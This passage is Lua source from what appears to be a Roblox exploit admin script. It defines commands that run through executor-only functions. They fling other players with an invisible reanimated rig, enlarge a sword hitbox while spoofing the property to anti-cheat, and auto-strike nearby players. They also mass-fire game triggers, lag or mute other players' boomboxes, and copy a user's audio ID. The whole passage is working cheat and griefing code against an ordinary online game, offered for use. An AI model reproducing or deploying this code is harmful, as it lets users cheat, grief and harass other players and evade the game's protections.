				C0=cf(-1,-1,0,0,0,-1,0,1,0,1,0,0),
				C1=cf(-0.5,1,0,0,0,-1,0,1,0,1,0,0)
			})
			tinsert(joints,{
				Part0=R6parts.root,Part1=rootpart,
				C0=cf_0,C1=cf_0
			})
			refreshjoints(rootpart)
			local function getpart(n)
				for i,_ in pairs(cframes) do
					if (i.Name==n) and (type(i)~="table") then
						return i
					end
				end
				return nil
			end
			local function makejoint(p0, p1, p2)
				p1=getpart(p1)
				p2=getpart(p2)
				if not (p1 and p2) then return end
				for i,v in pairs(joints) do
					if (v.Part0==p1) and (v.Part1==p2) then
						joints[i]=nil
					elseif (v.Part0==p2) and (v.Part1==p1) then
						joints[i]=nil
					end
				end
				tinsert(joints,{
					Part0=p0,Part1=p1,
					C0=cf_0,
					C1=cframes[p1]:Inverse()*cframes[p0]
				})
			end
			makejoint(R6parts.head,"Head","UpperTorso")
			makejoint(R6parts.leftArm,"LeftUpperArm","UpperTorso")
			makejoint(R6parts.rightArm,"RightUpperArm","UpperTorso")
			makejoint(R6parts.leftLeg,"LeftUpperLeg","LowerTorso")
			makejoint(R6parts.rightLeg,"RightUpperLeg","LowerTorso")
			makejoint(R6parts.torso,"LowerTorso","HumanoidRootPart")
		end

		local function getPart(name,blacklist)
			for i,v in pairs(cframes) do
				if (i.Name==name) and not (blacklist and tfind(blacklist,i)) then
					return i
				end
			end
			return nil
		end

		local function getPartFromMesh(meshid,textureid,blacklist)
			for v,_ in pairs(cframes) do
				if (type(v)~="table") and not (blacklist and tfind(blacklist,v)) then
					if v:IsA("MeshPart") and sfind(v.MeshId,meshid) and sfind(v.TextureID,textureid) then 
						return v
					else
						local m=v:FindFirstChildOfClass("SpecialMesh")
						if m and sfind(m.MeshId,meshid) and sfind(m.TextureId,textureid) then
							return v
						end
					end
				end
			end
			return nil
		end

		local function getJoint(name)
			for i,v in pairs(joints) do
				if v.Name==name then
					return v
				end
			end
			return {C0=cf_0,C1=cf_0}
		end

		local function getPartJoint(handle)
			for i,v in pairs(joints) do
				if v.Part0==handle then
					return v
				end
			end
			for i,v in pairs(joints) do
				if v.Part1==handle then
					return v
				end
			end
			return nil
		end

		local accessorylimbs={
			{meshid="0",textureid="0",C0=cf_0,Name="Torso"},
			{meshid="0",textureid="0",C0=cf(-0,-1.1,-0.1)*angles(rad(10),rad(0),rad(0)),Name="Left Arm"},
			{meshid="0",textureid="0",C0=cf(0.1,-0,-0)*angles(rad(0),rad(0),rad(90)),Name="Right Arm"},
			{meshid="0",textureid="0",C0=angles(rad(90),rad(0),rad(0)),Name="Left Leg"},
			{meshid="0",textureid="0",C0=angles(rad(90),rad(-0),rad(-0)),Name="Right Leg"}
		}

		for i=1,#accessorylimbs do
			local v=accessorylimbs[i]
			local p=getPart(v.Name)
			local h=getPartFromMesh(v.meshid,v.textureid)
			local w=getPartJoint(h)
			if p and w then
				w.C0=v.C0
				w.Part0=h
				w.C1=cf_0
				w.Part1=p
			end
		end

		local raycastparams=RaycastParams.new()
		raycastparams.FilterType=e.RaycastFilterType.Blacklist
		raycastparams.RespectCanCollide=true
		local rayfilter={}
		local characters={}
		local function refreshrayfilter()
			for i=1,#rayfilter do
				rayfilter[i]=nil
			end
			local len=0
			for i,v in pairs(characters) do
				len=len+1
				rayfilter[len]=v
			end
			raycastparams.FilterDescendantsInstances=rayfilter
		end
		local function onplayer(v)
			characters[v]=v.Character
			v:GetPropertyChangedSignal("Character"):Connect(function()
				characters[v]=v.Character
				refreshrayfilter()
			end)
			refreshrayfilter()
		end
		local plrst=plrs:GetPlayers()
		for i=1,#plrst do onplayer(plrst[i]) end
		plrs.PlayerAdded:Connect(onplayer)
		plrs.PlayerRemoving:Connect(function(v)
			characters[v]=nil
		end)

		local mradN05=rad(-0.5)
		local enumMLC=e.MouseBehavior.LockCenter
		local enumMB2=e.UserInputType.MouseButton2
		local enumMLCP=e.MouseBehavior.LockCurrentPosition
		local enumMD=e.MouseBehavior.Default
		local enumMW=e.UserInputType.MouseWheel

		local mode="default"
		local modes={default={}}
		local function addmode(key,mode)
			if (type(key)~="string") or (type(mode)~="table") then
				return
			end
			for i, v in pairs(mode) do
				if type(v)~="function" then
					mode[i]=nil
				end
			end
			if key=="default" then
				modes.default=mode
				if mode.modeEntered then
					mode.modeEntered()
				end
			elseif #key==1 then
				key=e.KeyCode[supper(ssub(key,1,1))]
				modes[key]=mode
			end
		end

		local keyW=e.KeyCode.W
		local keyA=e.KeyCode.A
		local keyS=e.KeyCode.S
		local keyD=e.KeyCode.D
		local keySpace=e.KeyCode.Space
		local keyShift=e.KeyCode.LeftShift
		local movementkeys = {
			[keyW]=false,
			[keyA]=false,
			[keyS]=false,
			[keyD]=false,
			[keySpace]=false
		}
		uis.InputBegan:Connect(function(a)
			if gs.MenuIsOpen or uis:GetFocusedTextBox() then
				return
			end
			a=a.KeyCode
			if movementkeys[a]==false then
				movementkeys[a]=true
			elseif a==keyShift then
				shiftlock=allowshiftlock and not shiftlock
			elseif modes[a] then
				if modes[mode].modeLeft then
					modes[mode].modeLeft()
				end
				if mode==a then
					mode="default"
				else
					mode=a
				end
				if modes[mode].modeEntered then
					modes[mode].modeEntered()
				end
			end
		end)
		uis.InputEnded:Connect(function(a)
			if movementkeys[a.KeyCode] then
				movementkeys[a.KeyCode]=false
			end
		end)
		uis.InputChanged:Connect(function(a,b)
			if (not b) and (a.UserInputType==enumMW) then
				camoff=camoff+a.Position*v3_001*(0.75-camoff.Z/4)
				if camoff.Z>0 then
					camoff=camoff-camoff.Position
				end
				firstperson=camoff.Z==0
			end
		end)

		local lostPart=nil
		local flingcf=nil
		local flingvel=nil
		local flingid=0
		local currentflingpart=nil
		local function fling(target,duration,rotVelocity)
			currentflingpart=nil
			for i,v in pairs(flingparts) do
				if v and (not v.Anchored) and v:IsDescendantOf(ws) and (v.ReceiveAge == 0) then
					currentflingpart=v
					break
				end
			end
			if not currentflingpart then 
				return twait() and false
			end
			if typeof(target)=="Instance" then
				if target:IsA("BasePart") then
					target=target.Position
				elseif target:IsA("Model") then
					target=gp(target,"HumanoidRootPart","BasePart") or gp(target,"Torso","BasePart") or gp(target,"UpperTorso","BasePart") or target:FindFirstChildWhichIsA("BasePart")
					if target then
						target=target.Position
					else
						return twait() and false
					end
				elseif target:IsA("Humanoid") then
					target=target.Parent
					if not (target and target:IsA("Model")) then
						return twait() and false
					end
					target=gp(target,"HumanoidRootPart","BasePart") or gp(target,"Torso","BasePart") or gp(target,"UpperTorso","BasePart") or target:FindFirstChildWhichIsA("BasePart")
					if target then
						target=target.Position
					else
						return twait() and false
					end
				else
					return twait() and false
				end
			elseif typeof(target)=="CFrame" then
				target=target.Position
			elseif typeof(target)~="Vector3" then
				target=mouse.Hit
				if target then
					target=target.Position
				else
					return twait() and false
				end
			end
			if type(duration)~="number" then
				duration=tonumber(duration) or 0.5
			end
			if typeof(rotVelocity)~="Vector3" then
				rotVelocity=defaultflingvel
			end
			if (type(maxflingtrsp)=="number") and (currentflingpart.Transparency>maxflingtrsp) then
				currentflingpart.Transparency=maxflingtrsp
			end
			flingcf=cf(target)
			flingvel=rotVelocity
			flingid=flingid+1
			local thisfling=flingid
			twait(duration)
			if flingid==thisfling then
				flingcf=nil
				currentflingpart=nil
			end
			return true
		end

		local pflingid=0
		local function predictionfling(target,duration,rotVelocity,stopOnVelMag)
			if typeof(target)~="Instance" then 
				target=mouse.Target
				if not target then
					return twait() and false
				end
			end
			if target:IsA("Humanoid") or target:IsA("BasePart") then 
				target=target.Parent 
				if target:IsA("Accessory") then
					target=target.Parent
				end
			end
			if (not target:IsA("Model")) or (target==c) then
				return twait() and false
			end
			target=gp(target,"HumanoidRootPart","BasePart") or gp(target,"Torso","BasePart") or gp(target,"UpperTorso","BasePart")
			if not (target and target:IsDescendantOf(ws)) then
				return twait() and false
			end
			if stopOnVelMag then
				duration=tonumber(duration) or 5
				stopOnVelMag=tonumber(stopOnVelMag) or 1000
			elseif type(stopOnVelMag)=="boolean" then
				duration=tonumber(duration) or 1
				stopOnVelMag=nil
			else 
				duration=tonumber(duration) or 5
				stopOnVelMag=1000
			end
			local stopTime=sine+duration
			pflingid=pflingid+1
			local thisfling=pflingid
			local con=nil
			con=heartbeat:Connect(function(deltaTime)
				if (thisfling~=pflingid) or (sine>stopTime) or (stopOnVelMag and (target.Velocity.Magnitude>stopOnVelMag)) or (not (target and target:IsDescendantOf(ws))) then
					return con:Disconnect()
				end
				fling(target.Position+target.Velocity*(sin(sine*15)+1),0,rotVelocity)
			end)
			twait()
			return true
		end

		if ctrlclicktp then
			ctrlclicktp=e.KeyCode.LeftControl
			local tpoff=v3_010*3
			if clickfling==0 then
				mouse.Button1Down:Connect(function()
					if uis:IsKeyDown(ctrlclicktp) then
						if mouse.Target then
							pos=mouse.Hit.Position+tpoff
							cfr=cf(pos,pos+camoff.LookVector*v3_101)
							xzvel=v3_0
							Yvel=0
						end
					else
						fling()
					end
				end)
			elseif clickfling==1 then
				mouse.Button1Down:Connect(function()
					if uis:IsKeyDown(ctrlclicktp) then
						if mouse.Target then
							pos=mouse.Hit.Position+tpoff
							cfr=cf(pos,pos+camoff.LookVector*v3_101)
							xzvel=v3_0
							Yvel=0
						end
					else
						predictionfling()
					end
				end)
			elseif clickfling == 2 then
				mouse.Button1Down:Connect(function()
					if uis:IsKeyDown(ctrlclicktp) then
						if mouse.Target then
							pos=mouse.Hit.Position+tpoff
							cfr=cf(pos,pos+camoff.LookVector*v3_101)
							xzvel=v3_0
							Yvel=0
						end
					elseif not predictionfling() then
						fling()
					end
				end)
			else
				mouse.Button1Down:Connect(function()
					if mouse.Target and uis:IsKeyDown(ctrlclicktp) then
						pos=mouse.Hit.Position+tpoff
						cfr=cf(pos,pos+camoff.LookVector*v3_101)
						xzvel=v3_0
						Yvel=0
					end
				end)
			end
		else
			if clickfling==0 then
				mouse.Button1Down:Connect(fling)
			elseif clickfling==1 then
				mouse.Button1Down:Connect(predictionfling)
			elseif clickfling==2 then
				mouse.Button1Down:Connect(function()
					if not predictionfling() then fling() end
				end)
			end
		end

		local noYvelTime=1
		local lastsine=sine
		local pose=nil
		local con=nil
		local function mainFunction()
			if not c then 
				uis.MouseBehavior=enumMD
				onnewcamera()
				local c=lp.Character
				if c then
					cam.CameraSubject=c:FindFirstChildOfClass("Humanoid")
				end
				return con and con:Disconnect() 
			end

			sine=osclock()
			local delta=sine-lastsine
			deltaTime=clamp(delta*10,0,1)
			lastsine=sine

			if shiftlock then
				if allowshiftlock then
					uis.MouseBehavior=enumMLC
					local rotation=uis:GetMouseDelta()*mradN05
					camoff=cf(camoff.Position,camoff.Position+camoff.LookVector)*angles(rotation.Y,rotation.X,0)
				else
					shiftlock=false
				end
			elseif firstperson then
				uis.MouseBehavior=enumMLC
				local rotation=uis:GetMouseDelta()*mradN05
				camoff=cf(camoff.Position,camoff.Position+camoff.LookVector)*angles(rotation.Y,rotation.X,0)
			elseif uis:IsMouseButtonPressed(enumMB2) then
				uis.MouseBehavior=enumMLCP
				local rotation=uis:GetMouseDelta()*mradN05
				camoff=cf(camoff.Position,camoff.Position+camoff.LookVector)*angles(rotation.Y,rotation.X,0)
			else
				uis.MouseBehavior=enumMD
			end

			local raycastresult=ws:Raycast(pos,v3_010*fpdh-pos,raycastparams)
			local onground=nil
			if raycastresult then
				raycastresult=raycastresult.Position
				onground=(pos.Y-raycastresult.Y)<3.01
				if onground then
					Yvel=0
					cfr=cfr+v3_010*(raycastresult.Y+3-pos.Y)*clamp(delta*20,0,1)
					if movementkeys[keySpace] then
						Yvel=jumpPower
					end
				else
					Yvel=Yvel-gravity*delta
					if pos.Y+Yvel*delta<raycastresult.Y then
						Yvel=0
						cfr=cfr+v3_010*(raycastresult.Y+3-pos.Y)
					end
				end
			else
				Yvel=0
				onground=false
			end
			xzvel=v3_0
			if movementkeys[keyW] then
				xzvel=xzvel+(camoff.LookVector*v3_101).Unit
			end
			if movementkeys[keyS] then
				xzvel=xzvel-(camoff.LookVector*v3_101).Unit
			end
			if movementkeys[keyA] then
				xzvel=xzvel-(camoff.RightVector*v3_101).Unit
			end
			if movementkeys[keyD] then
				xzvel=xzvel+(camoff.RightVector*v3_101).Unit
			end
			pos=cfr.Position
			if shiftlock or firstperson then
				if xzvel.Magnitude>0 then
					xzvel=xzvel.Unit*walkSpeed
				end
				cfr=cf(pos,pos+camoff.LookVector*v3_101)
			elseif xzvel.Magnitude>0 then
				xzvel=xzvel.Unit*walkSpeed
				cfr=cfr:Lerp(cf(pos,pos+xzvel),deltaTime)
			end
			cfr=cfr+(xzvel+(v3_010*Yvel))*delta
			pos=cfr.Position

			camcf=cf(pos,pos+camoff.LookVector)+camoff.LookVector*camoff.Z+v3_0150
			if shiftlock and not firstperson then
				camcf=camcf+camcf.RightVector*1.75
			end
			if cam then
				cam.CFrame=camcf
			end

			if onground then
				if xzvel==v3_0 then
					pose="idle"
				else
					pose="walk"
				end
			elseif Yvel>0 then
				pose="jump"
			else
				pose="fall"
			end
			local lerpfunc=modes[mode][pose]
			lerpfunc=lerpfunc or modes.default[pose]
			if lerpfunc then
				lerpfunc()
			end

			cframes[rootpart]=cfr
			refreshjoints(rootpart)

			if abs(Yvel)>1 then
				noYvelTime=0
			else
				noYvelTime=clamp(noYvelTime+delta*0.3,0,1)
				xzvel=xzvel*(1-noYvelTime)
			end

			local idleoff=v3(sin((sine-0.01875)*32),sin(sine*32),sin((sine+0.0375)*32))*0.001		
			local idlerv=v3_010*sin(sine*32)

			for i,v in pairs(cframes) do
				if (not i.Anchored) and i:IsDescendantOf(ws) then
					if i.ReceiveAge==0 then
						if (i==currentflingpart) and flingcf then
							flingcf=flingcf*angles(0,flingvel.Unit.Y*-deltaTime,0)
							v=flingcf
							i.RotVelocity=flingvel+idlerv
						else
							i.RotVelocity=idlerv
						end
						local vel=(v.Position-lastpositions[i])/delta
						lastpositions[i]=v.Position
						if vel.Magnitude<0.15 then
							v=v+idleoff
						end
						if (i==reclaim) and lostPart then
							v=lostPart.CFrame
							lostPart=nil
							i.Velocity=v3_0
						else
							i.Velocity=getNetlessVelocity(vel*noYvelTime+xzvel)
						end
						if novoid and (v.Y<novoid) then
							v=v+v3_010*(novoid-v.Y)
						end
						i.CFrame=v
					else
						lastpositions[i]=i.Position
						if reclaim and (i~=reclaim) then
							lostPart=i
						end
					end
				end
			end
			if simrad then
				shp(lp,"SimulationRadius",simrad)
			end
		end

		con=heartbeat:Connect(mainFunction)
		mainFunction()

		local legcfR=cf(1,-1,0)
		local legcfL=cf(-1,-1,0)
		local raydir=v3_010*-2
		local function raycastlegs() --this returns 2 values: right leg raycast offset, left leg raycast offset
			local rY=ws:Raycast((cfr*legcfR).Position,raydir,raycastparams)
			local lY=ws:Raycast((cfr*legcfL).Position,raydir,raycastparams)
			return rY and (rY.Position.Y-(pos.Y-3)) or 0,lY and (lY.Position.Y-(pos.Y-3)) or 0
		end

	
		local lastvel=v3_0
		local velchg1=vf3_0

		return {
			raycastlegs=raycastlegs,				
			addmode=addmode,
			getPart=getPart,
			getPartFromMesh=getPartFromMesh,
			getJoint=getJoint,
			getPartJoint=getPartJoint,
			
		}
	end

	local t=reanimate()
	if type(t)~="table" then return end
	local raycastlegs=t.raycastlegs
	local addmode=t.addmode
	local getJoint=t.getJoint
	local RootJoint=getJoint("RootJoint")
	local RightShoulder=getJoint("Right Shoulder")
	local LeftShoulder=getJoint("Left Shoulder")
	local RightHip=getJoint("Right Hip")
	local LeftHip=getJoint("Left Hip")
	local Neck=getJoint("Neck")
	addmode("default", {
		idle = function()
			RootJoint.C0=RootJoint.C0:Lerp(cf(0,-10,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
			RightShoulder.C0=RightShoulder.C0:Lerp(cf(-0.5,0.5,0.5)*angles(1.5707963267948966,1.5707963267948966,0),deltaTime) 
			RightHip.C0=RightHip.C0:Lerp(cf(1,1,0)*angles(0,1.5707963267948966,0),deltaTime) 
			LeftHip.C0=LeftHip.C0:Lerp(cf(-1,1,0)*angles(0,-1.5707963267948966,0),deltaTime) 
			LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(0.5,0.5,0.5)*angles(1.5707963267948966,-1.5707963267948966,0),deltaTime) 
			Neck.C0=Neck.C0:Lerp(cf(0,0,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
			end,
		walk = function()
			RootJoint.C0=RootJoint.C0:Lerp(cf(0,-10,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
			RightShoulder.C0=RightShoulder.C0:Lerp(cf(-0.5,0.5,0.5)*angles(1.5707963267948966,1.5707963267948966,0),deltaTime) 
			RightHip.C0=RightHip.C0:Lerp(cf(1,1,0)*angles(0,1.5707963267948966,0),deltaTime) 
			LeftHip.C0=LeftHip.C0:Lerp(cf(-1,1,0)*angles(0,-1.5707963267948966,0),deltaTime) 
			LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(0.5,0.5,0.5)*angles(1.5707963267948966,-1.5707963267948966,0),deltaTime) 
			Neck.C0=Neck.C0:Lerp(cf(0,0,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
		end,
		jump = function()
			RootJoint.C0=RootJoint.C0:Lerp(cf(0,-10,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
			RightShoulder.C0=RightShoulder.C0:Lerp(cf(-0.5,0.5,0.5)*angles(1.5707963267948966,1.5707963267948966,0),deltaTime) 
			RightHip.C0=RightHip.C0:Lerp(cf(1,1,0)*angles(0,1.5707963267948966,0),deltaTime) 
			LeftHip.C0=LeftHip.C0:Lerp(cf(-1,1,0)*angles(0,-1.5707963267948966,0),deltaTime) 
			LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(0.5,0.5,0.5)*angles(1.5707963267948966,-1.5707963267948966,0),deltaTime) 
			Neck.C0=Neck.C0:Lerp(cf(0,0,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
		end,
		fall = function()
			RootJoint.C0=RootJoint.C0:Lerp(cf(0,-10,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
			RightShoulder.C0=RightShoulder.C0:Lerp(cf(-0.5,0.5,0.5)*angles(1.5707963267948966,1.5707963267948966,0),deltaTime) 
			RightHip.C0=RightHip.C0:Lerp(cf(1,1,0)*angles(0,1.5707963267948966,0),deltaTime) 
			LeftHip.C0=LeftHip.C0:Lerp(cf(-1,1,0)*angles(0,-1.5707963267948966,0),deltaTime) 
			LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(0.5,0.5,0.5)*angles(1.5707963267948966,-1.5707963267948966,0),deltaTime) 
			Neck.C0=Neck.C0:Lerp(cf(0,0,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
		end
	})
	Utils.Notify(Caller, "InvisToolFling", "Loaded!")	
end)

AddCommand("reach", {"swordreach"}, "changes handle size of your tool", {1, 3}, function(Caller, Args, CEnv)
	local Amount = Args[1] or 2
	local Tool = FindFirstChildWhichIsA(LocalPlayer.Character, "Tool") or FindFirstChildWhichIsA(LocalPlayer.Backpack, "Tool");
	local Handle = Tool.Handle
	local Size = Handle.Size
	CEnv[Tool] = Size
	SpoofProperty(Handle, "Size");
	SpoofProperty(Handle, "Massless");
	Handle.Size = Vector3New(Size.X, Size.Y, tonumber(Amount or 30));
	Handle.Massless = true
	Utils.Notify(Caller, "Reach", "Reach set to "..Amount)
end)

AddCommand("noreach", {"noswordreach"}, "removes sword reach", {}, function()
	local ReachedTools = LoadCommand("reach").CmdEnv
	if (not next(ReachedTools)) then
		return "Reach isn't enabled."
	end
	for i, v in next, ReachedTools do
		i.Size = v
	end
	LoadCommand("reach").CmdEnv = {}
	Utils.Notify(Caller, "Reach", "Disabled!")
end)

AddCommand("swordaura", {"saura"}, "sword aura", {3}, function(Caller, Args, CEnv)
	DisableAllCmdConnections("swordaura");
	local SwordDistance = tonumber(Args[1]) or 10
	local Tool = FindFirstChildWhichIsA(GetCharacter(), "Tool") or FindFirstChildWhichIsA(LocalPlayer.Backpack, "Tool");
	local PlayersTbl = filter(GetPlayers(Players), function(i, v)
		return v ~= LocalPlayer
	end)
	PlayersTbl = map(PlayersTbl, function(i, Player)
		AddConnection(CConnect(Player.CharacterAdded, function()
			PlayersTbl[i] = {Player, Player.Character}
		end), CEnv);
		return {Player, Player.Character}
	end)

	local Hit = function(i, v)
		Tool.Activate(Tool);
		if (FindFirstChild(Tool, "Handle")) then
			firetouchinterest(Tool.Handle, v, 0);
			wait();
			firetouchinterest(Tool.Handle, v, 1);
		elseif (FindFirstChild(Tool, "HitBox")) then
			firetouchinterest(Tool.HitBox, v, 0);
			wait();
			firetouchinterest(Tool.HitBox, v, 1);
		else 
			local Part = FindFirstChildOfClass(Tool, "Part")
			if (Part) then
				firetouchinterest(Tool.HitBox, v, 0);
				wait();
				firetouchinterest(Tool.HitBox, v, 1);
			end
		end
	end
	local Character = GetCharacter();
	AddConnection(CConnect(Heartbeat, function()
		Character = Character or GetCharacter();
		Tool = FindFirstChildWhichIsA(Character, "Tool") or FindFirstChildWhichIsA(LocalPlayer.Backpack, "Tool");
		if (Tool and Tool.Handle) then
			for i, v in next, PlayersTbl do
				if (GetRoot(v[1], v[2]) and GetHumanoid(v[1], v[2]) and GetHumanoid(v[1], v[2]).Health ~= 0 and GetMagnitude(v[1], v[2]) <= SwordDistance) then
					if (GetHumanoid().Health ~= 0) then
						Tool.Parent = Character
						local BaseParts = filter(GetChildren(GetCharacter(v[1], v[2])), function(i, v)
							return IsA(v, "BasePart");
						end)
						forEach(BaseParts, Hit);
					end
				end
			end
		end
	end), CEnv);

	AddConnection(CConnect(Players.PlayerAdded, function(Plr)
		PlayersTbl[#PlayersTbl + 1] = Plr
	end), CEnv);
	AddConnection(CConnect(Players.PlayerRemoving, function(Plr)
		PlayersTbl[indexOf(PlayersTbl, Plr)] = nil
	end), CEnv);
	Utils.Notify(Caller, "Swordaura", "Swordaura set with distance ".. SwordDistance)
end)

AddCommand("noswordaura", {}, "stops the sword aura", {}, function()
	local Aura = LoadCommand("swordaura").CmdEnv
	if (not next(Aura)) then
		return "sword aura is not enabled"
	end
	DisableAllCmdConnections("swordaura");
	Utils.Notify(Caller, "Swordaura", "Disabled!")
end)

AddCommand("anchor", {}, "freezes your character", {3}, function()
	local BaseParts = filter(GetChildren(GetCharacter(v)), function(i, v)
		return IsA(v, "BasePart");
	end)
	for i, v in next, BaseParts do
		SpoofProperty(v, "Anchored");
		v.Anchored = true
	end
	Utils.Notify(Caller, "Anchor", "Enabled!")
end)

AddCommand("unanchor", {"thaw"}, "unfreezes your character", {3}, function()
	local BaseParts = filter(GetChildren(GetCharacter(v)), function(i, v)
		return IsA(v, "BasePart");
	end)
	for i, v in next, BaseParts do
		v.Anchored = false
	end
	Utils.Notify(Caller, "Anchor", "Disabled!")
end)

AddCommand("streamermode", {}, "changes names of everyone to something random", {}, function(Caller, Args, CEnv)
	local Rand = function(len) return gsub(sub(GenerateGUID(Services.HttpService), 2, len), "-", "") end
	local Players = Services.Players
	local Hide = function(a, v)
		if (v and IsA(v, "TextLabel") or IsA(v, "TextButton")) then
			local Player = GetPlayer(v.Text, true);
			if (not Player[1]) then
				Player = GetPlayer(sub(v.Text, 2, #v.Text - 2), true);
			end
			v.Text = Player[1] and Player[1].Name or v.Text
			if (Player and FindFirstChild(Players, v.Text)) then
				CEnv[v.Name] = v.Text
				local NewName = Rand(len(v.Text));
				if (GetCharacter(v.Text)) then
					Players[v.Text].Character.Humanoid.DisplayName = NewName
				end
				v.Text = NewName
			end
		end
	end

	forEach(GetDescendants(game), Hide);

	AddConnection(CConnect(game.DescendantAdded, function(x)
		Hide(nil, x);
	end), CEnv);
	Utils.Notify(Caller, "Streamermode", "Enabled!")
end)

AddCommand("nostreamermode", {"unstreamermode"}, "removes all the changed names", {}, function(Caller, Args, CEnv)
	local changed = LoadCommand("streamermode").CmdEnv
	for i, v in next, changed do
		if (type(v) == 'userdata' and v.Disconnect) then
			Disconnect(v);
		else
			i.Text = v
		end
	end
	Utils.Notify(Caller, "Streamermode", "Disabled!")
end)

AddCommand("fireclickdetectors", {"clickdetectors", "fcd"}, "fires all the click detectors", {3}, function(Caller, Args)
	local amount = 0
	local howmany = Args[1]
	for i, v in next, GetDescendants(Services.Workspace) do
		if (IsA(v, "ClickDetector")) then
			fireclickdetector(v);
			amount = amount + 1
			if (howmany and amount == tonumber(howmany)) then break; end
		end
	end
	return format("Fired %d amount of clickdetectors", amount);
end)

AddCommand("firetouchinterests", {"touchinterests", "fti"}, "fires all the touch interests", {3}, function(Caller, Args)
	local amount = 0
	local howmany = Args[1]
	for i, v in next, GetDescendants(Services.Workspace) do
		if (IsA(v, "TouchTransmitter")) then
			firetouchinterest(GetRoot(), v.Parent, 0);
			wait();
			firetouchinterest(GetRoot(), v.Parent, 1);
			amount = amount + 1
			if (howmany and amount == tonumber(howmany)) then break; end
		end
	end
	return format("Fired %d amount of touchtransmitters", amount);
end)

AddCommand("fireproximityprompts", {"proximityprompts", "fpp"}, "fires all the proximity prompts", {3}, function(Caller, Args)
	local amount = 0
	local howmany = Args[1]
	for i, v in next, GetDescendants(Services.Workspace) do
		if (IsA(v, "ProximityPrompt")) then
			fireproximityprompt(v, 0);
			wait();
			fireproximityprompt(v, 1);
			amount = amount + 1
			if (howmany and amount == tonumber(howmany)) then break; end
		end
	end
	return format("Fired %d amount of proximityprompts", amount);
end)

AddCommand("mute", {}, "mutes a users boombox", {}, function(Caller, Args)	
	local Target = GetPlayer(Args[1]);
	for i, v in next, Target do
		for i2, v2 in next, GetDescendants(v.Character) do
			if (IsA(v2, "Sound")) then
				v2.Playing = false
			end
		end
	end
end)

AddCommand("muteserver", {}, "mutes all sound in the server", {}, function(Caller)
	Utils.Notify(Caller, "Muteserver", "Muted all sounds!")
	Muteserver = true
	while Muteserver == true do 
		task.wait()
		for _, sound in next, workspace:GetDescendants() do
			if sound:IsA("Sound") then
				sound:Stop()
			end
		end
	end
end)

AddCommand("unmuteserver", {}, "unmutes all sound in the server", {}, function(Caller)	
	Muteserver = false
	Utils.Notify(Caller, "Muteserver", "Stopped!")
end)

local audioLagLoopRunning = false  
AddCommand("audiolag", {}, "lags a user's boombox", {}, function(Caller, Args, CEnv)
	local Target = GetPlayer(Args[1])

	local function updateBoomboxTimePosition(boombox)
		boombox.TimePosition = math.random(1, 50)
	end

	local function updateCharacterBoomboxTimePosition(character)
		for i, v in ipairs(character:GetDescendants()) do
			if v:IsA("Sound") then
				updateBoomboxTimePosition(v)
			end
		end
	end

	local function updatePlayerBoomboxTimePosition(player)
		for i, v in ipairs(player.Backpack:GetDescendants()) do
			if v:IsA("Sound") then
				updateBoomboxTimePosition(v)
			end
		end

		local character = player.Character
		if character then
			updateCharacterBoomboxTimePosition(character)
		end
	end

	local loopDelay = 0.4

	local function audioLagLoop()
		while audioLagLoopRunning do
			for i, player in ipairs(Target) do
				updatePlayerBoomboxTimePosition(player)
			end
			task.wait(loopDelay)
		end
	end

	audioLagLoopRunning = true
	spawn(audioLagLoop)
end)

AddCommand("stopaudiolag", {}, "stops the audio lag", {}, function(Caller, Args, CEnv)
	audioLagLoopRunning = false  
end)

AddCommand("checksound", {}, "checks if sound can be played  ", {}, function(Caller, Args, CEnv)
	if Services.SoundService.RespectFilteringEnabled == false then
		Utils.Notify(Caller, "Sound Check", "Sounds CAN be exploited.")
	else if Services.SoundService.RespectFilteringEnabled == true then
			Utils.Notify(Caller, "Sound Check", "Sounds CAN'T be exploited.")
		end
	end
end)

AddCommand("checkbackpack", {"backpack"}, "checks how much tools someone have", {}, function(Caller, Args)
	local target = getplr(Args[1]);
	local Tools = GetChildren(target.Backpack);
	for i,v in pairs(target.Backpack:GetChildren()) do
		if v:IsA('Tool') or v:IsA('HopperBin') then
			return format(target.Name ..(" got %d tool (s)"), #Tools);
		end
	end
	return format (target.Name ..(" got 0 tools in the backpack."))
end)

AddCommand("audiotime", {"audiotimeposition"}, "changes audio timeposition", {"1",1}, function(Caller, Args)
	local Time = Args[1]
	if (not tonumber(Time)) then
		return "Time must be a number."
	end
	local filterplayingboomboxes = function(i,v)
		return IsA(v, "Tool") and FindFirstChild(v, "Handle") and FindFirstChildWhichIsA(v.Handle, "Sound") and FindFirstChildWhichIsA(v.Handle, "Sound").Playing == true
	end
	local OtherPlayingBoomboxes = LoadCommand("forceplay").CmdEnv
	local Boombox = filter(tbl_concat(GetChildren(LocalPlayer.Backpack), GetChildren(GetCharacter())), filterplayingboomboxes)
	if (not next(Boombox) and not next(OtherPlayingBoomboxes)) then
		return "You need a boombox to change the timeposition."
	end
	Boombox = Boombox[1]
	if (Boombox) then
		FindFirstChild(Boombox, "Sound", true).TimePosition = floor(tonumber(Time));
	else
		for i, v in next, OtherPlayingBoomboxes do
			FindFirstChild(i, "Sound", true).TimePosition = floor(tonumber(Time));
		end
	end
	return "Changed time position to " .. Time
end)

AddCommand("getaudio", {}, "audio logs someone", {}, function(Caller, Args)
	local Target = GetPlayer(Args[1]);
	for i, v in next, Target do
		for i2, v2 in next, GetDescendants(v.Character) do
			if (IsA(v2, "Sound") and IsA(v2.Parent.Parent, "Tool")) then
				local AudioId = split(v2.SoundId, "=")[2]
				setclipboard(AudioId);
				Utils.Notify(Caller, "Command", format("Audio Id (%s) copied to clipboard", AudioId));
			end
		end
	end
end)

AddCommand("audioreplicate", {"replicate"}, "replicate someones audio", {}, function(Caller, Args)
	local Target = GetPlayer(Args[1]);
	for i, v in next, Target do
		for i2, v2 in next, GetDescendants(v.Character) do
			if (IsA(v2, "Sound") and IsA(v2.Parent.Parent, "Tool")) then
				local AudioId = split(v2.SoundId, "=")[2]
				local Character = GetCharacter();
